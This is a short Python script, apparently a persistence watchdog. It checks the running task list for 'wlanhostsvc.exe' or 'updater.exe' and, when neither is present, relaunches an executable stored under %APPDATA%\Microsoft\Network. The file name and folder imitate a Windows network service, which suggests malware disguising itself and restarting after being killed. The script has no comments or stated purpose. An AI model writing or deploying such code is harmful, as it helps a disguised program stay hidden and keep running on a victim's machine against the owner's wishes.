from subprocess import run
from os import startfile, path, getenv
from time import sleep

tries = 0
max = 12

targetfp = path.join(path.join(getenv("APPDATA"), "Microsoft", "Network", "wlanhostsvc.exe"))
def check(name):
    return name in run("tasklist",shell=True,text=True,capture_output=True).stdout
while True:
    if not check("wlanhostsvc.exe") and not check("updater.exe"):
        tries = tries+1
        print(tries)
        if tries > max:
            startfile(targetfp)
            tries = 0
        sleep(1)
    else:
        tries = 0
    sleep(0.05)